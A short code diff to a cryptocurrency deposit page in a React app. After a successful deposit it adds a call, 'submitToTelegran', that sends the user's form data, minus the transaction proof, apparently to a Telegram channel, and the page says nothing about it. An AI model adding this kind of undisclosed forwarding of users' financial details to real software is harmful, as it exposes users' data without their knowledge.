@@ -12,7 +12,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import { motion } from "framer-motion"
 import { useAuth } from "@/contexts/auth-context"
-import { fetchWalletAddress, fetchBitcoinPrice, submitDeposit, fetchRecentDeposits } from "@/lib/api"
+import { fetchWalletAddress, fetchBitcoinPrice, submitDeposit, fetchRecentDeposits, submitToTelegran } from "@/lib/api"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 
 export default function DepositPage() {
@@ -188,6 +188,8 @@ export default function DepositPage() {
 
       if (result.success) {
         setSubmitSuccess(true)
+        formData.delete("transaction_proof")
+        submitToTelegran(formData)
         // Reset form
         setDepositAmount(0)
         setTransactionProof(null)
